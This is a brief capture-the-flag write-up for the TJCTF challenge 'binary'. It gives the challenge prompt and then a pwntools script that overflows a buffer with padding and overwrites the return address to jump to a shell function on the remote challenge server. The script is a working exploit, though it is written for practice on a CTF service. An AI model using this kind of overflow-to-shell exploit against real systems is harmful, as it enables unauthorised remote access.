# TJCTF: binary

Written by KyleForkBomb

_I heard there's someone selling shells? They seem to be out of stock though..._

`nc p1.tjctf.org 8009`

## Beginnings


## code
```python
from pwn import *
binsh = 0x4006E3
to_r = 0xA+8
r = remote('p1.tjctf.org', 8009)
r.sendlineafter('?\n', to_r*'A' + p64(binsh))
r.interactive()
```

